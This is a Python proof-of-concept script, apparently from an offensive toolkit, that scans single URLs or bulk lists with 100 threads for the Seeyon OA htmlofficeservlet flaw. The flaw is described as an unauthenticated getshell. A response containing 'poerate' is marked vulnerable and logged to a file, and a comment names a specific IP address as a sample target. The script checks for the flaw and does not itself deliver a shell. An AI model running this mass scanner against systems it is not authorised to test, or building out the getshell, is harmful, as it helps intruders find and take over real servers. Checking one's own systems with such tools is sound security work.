import requests, argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
#http://124.235.217.138:8090/seeyon/htmlofficeservlet
def banner():
    test = ("""                                                   
______________________________________________ ___  /
___  __ \  _ \_  ___/_  ___/  __ \_  __ \  __ `/_  / 
__  /_/ /  __/  /   _(__  )/ /_/ /  / / / /_/ /_  /  
_  .___/\___//_/    /____/ \____//_/ /_/\__,_/ /_/   
/_/                                                  
                                    author:personal
                                    time:2024.9.10
                                    version:1.0.0
""")
    print(test)


def poc(target):
    payload = "/seeyon/htmlofficeservlet"
    proxie={
        'http': 'http://127.0.0.1:7890',
        'https': 'http://127.0.0.1:7890'
    }
    try:
        res1 = requests.get(url=target+payload, verify=False,proxies=proxie )
        if res1.status_code == 200 and 'poerate' in res1.text:
            print(f'[+]{target}存在漏洞')
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(f'{target}存在漏洞\n')
        else:
            print(f"该{target}不存在")
        # else:
        #     print(f"该{target}可能存在问题，请手工检测")
    except Exception as e:
        print(e)



def main():
    banner()
    url_list = []
    parser = argparse.ArgumentParser(description='致远 OA 协同管理软件无需登录getshell')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                url_list.append(url.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"您的输入有误，请使用python file_name.py -h for help")


if __name__ == '__main__':
    main()
